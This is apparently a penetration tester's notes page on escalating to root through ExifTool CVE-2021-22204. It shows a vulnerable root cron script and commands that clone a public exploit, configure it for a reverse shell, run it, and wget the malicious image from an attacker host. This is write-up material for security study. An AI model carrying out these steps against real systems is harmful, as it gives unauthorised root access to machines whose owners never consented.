---
description: Exiftool 7.44< <12.24 Priv Esc
---

# Exiftool

[https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)

CVE-2021-22204 can be triggered with a perfectly valid image (jpg, tiff, mp4 and many more) leading to arbitrary code execution!

Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image.

```
cat /etc/crontab
* *     * * *   root    bash /opt/image-exif.sh

www-data@test:/tmp$ cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/test/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

\*\*exiftool \*\*"$IMAGES/$filename" >> $LOGFILE

{% embed url="https://github.com/convisolabs/CVE-2021-22204-exiftool" %}

```
$ sudo apt install djvulibre-bin exiftool
(Change the IP and Port in the exploit.py file for reverse shell.)

$ git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
$ cd CVE-2021-22204-exiftool
$ python3 exploit.py

wget http://192.168.1.1/image.jpg
```
